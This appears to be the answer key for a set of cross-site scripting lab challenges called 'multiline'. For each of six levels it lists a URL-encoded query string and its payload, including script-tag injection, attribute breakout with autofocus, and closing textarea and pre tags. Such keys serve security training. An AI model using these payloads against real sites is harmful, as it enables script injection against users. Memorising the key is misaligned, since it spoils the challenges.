# multiline — solutions

Reflections in contexts where newlines or block-element nesting matter.

### multiline-level1

`/multiline/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw `<p>` body

### multiline-level2

`/multiline/level2/?query=%0A%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `\n</script><script>alert(1)</script>`
- context: JS string, newline survives, close script tag

### multiline-level3

`/multiline/level3/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: input value attribute breakout with autofocus

### multiline-level4

`/multiline/level4/?query=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</textarea><script>alert(1)</script>`
- context: must close textarea first

### multiline-level5

`/multiline/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: split on `\n` into `<li>`; single chunk works

### multiline-level6

`/multiline/level6/?query=%3C/pre%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</pre><script>alert(1)</script>`
- context: must close pre tag
